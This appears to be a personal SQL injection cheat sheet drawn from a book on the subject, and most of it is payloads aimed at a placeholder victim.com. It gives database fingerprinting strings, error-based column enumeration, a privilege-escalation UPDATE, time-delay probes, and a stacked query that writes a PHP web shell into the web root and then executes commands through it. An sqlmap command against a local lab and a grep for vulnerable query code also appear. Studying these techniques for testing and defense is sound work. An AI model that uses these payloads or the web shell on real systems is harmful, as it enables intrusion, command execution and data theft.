<h1 class="header">SQL Injection</h1>
</br>
*02 November 2014* | [View On Github](https://github.com/sevaivanov/kedfilms/blob/master/frontend/static/frontend/md/hacks/sqli.md#variations) | [Revision History](https://github.com/sevaivanov/kedfilms/commits/master/frontend/static/frontend/md/hacks/sqli.md)

*Source: SQL Injection Attacks and Defense, 2nd Ed by Justin Clarke*

# Variations

## Comments

* MS SQL, Oracle, PostgreSQL

        --          single line
        /**/        multiple lines

* MySQL

        --          single line, requires to be followed by a character
        #           single line
        /**/        multiple lines

* AND operator has a higher priority than OR operator

## Always true statement

* MS SQL

        'ab'='a'+'b

* MySQL

        'ab'='a'b

* Oracle & PostgreSQL

        'ab'='a'||'b

# Techniques

* Commenting helps identify the database by trying to login via injection

        [http://www.victim.com/displayuser.aspx?User=Bob](#) -- Original request
        
        [http://www.victim.com/displayuser.aspx?User=B’+’ob](#) -- MSSQL
        
        [http://www.victim.com/displayuser.aspx?User=B’’ob](#) -- MySQL
        
        [http://www.victim.com/displayuser.aspx?User=B’||’ob](#) -- Oracle or PostgreSQL

* Commenting helps to bypass the extraction of spaces from input

        [http://www.victim.com/messages/list.aspx?uid=45 or 1=1](#)
        
        [http://www.victim.com/messages/list.aspx?uid=45/∗∗/or/∗∗/1=1](#)

* String with error is returned because the divison int/str wasn't intended

        ’AND 1=0/@@version;--

* HAVING wihout aggregated function GROUP BY returns the first column name of the error

        ’HAVING '1'=’1

* Enumerate all the columns in a SELECT statement by appending the found column names

        ’GROUP BY productid HAVING ‘1‘=’1
        ’GROUP BY productid, name HAVING ‘1’=’1

* Use division error to discover column values

        ’AND 1=0/user;--

* Discover other accounts with a username combined with a negative condition

        ’AND User NOT IN (‘Admin’) AND 1=0/User AND '1'='1
        

# Related HTTP errors

* 500 : rendering
* 302 : redirection

# Advises

* Avoid expensive queries as it could generate thousands of rows

        ' AND '1'='1

* False condition will only return few or none depending on the query code

        ' AND '1'='2

* MS SQL add admin privileges

        UPDATE users SET isadmin=1 ...

* Send shell commands via get, works if enough priviledges i.e. isadmin=1

        [http://www.victim.com/search.php?s=test’; SELECT ‘<?php echo shell_exec($_GET[“cmd”]);?>’ INTO OUTFILE ‘/var/www/victim.com/shell.php’;--](#)

        [http://www.victim.com/shell.php?cmd=ls](#)

* Use time delays to identify sql injection, i.e. if GET took 1.2s, injection will be delayed
        
    * MS SQL

            [http://www.victim.com/display.php?id=32; SELECT BENCHMARK(10000000,ENCODE(‘hello’,‘mom’));--](#)
        
    * Oracle doesn’t support stacked queries.DBMS_LOCK package is available only for database admins.

            [http://www.victim.com/display.php?id=32 or 1=dbms_pipe.receive_message(‘RDS’, 10)](#)
        
    * PostegreSQL >= 8.2
    
            [http://www.victim.com/display.php?id=32; SELECT pg_sleep(10);--](#)

# Tools

* wget : quickly detect server response anomaly
* awk : processing text-based data

* grep & awk recursive search

        grep -r -n “\(mysql\|mssql\|mysql_db\)_query\(.∗\$\(GET\|\POST\) .∗\)” src/ | awk -F:
        ‘{print “filename: “$1”\nline: “$2”\nmatch: “$3”\n\n”}’

* Graudit : automated source code review (deps: bash, grep, sed)

* SQLmap

You can test it for tables enumeration & banner in SQLite [loveinjection](http://www.github.com/gliderousrabbits/loveinjection/) repository

        ./sqlmap.py -u http://127.0.0.1:8000/sqlite3/level1/ --data="username=admin&password=a" -b --tables
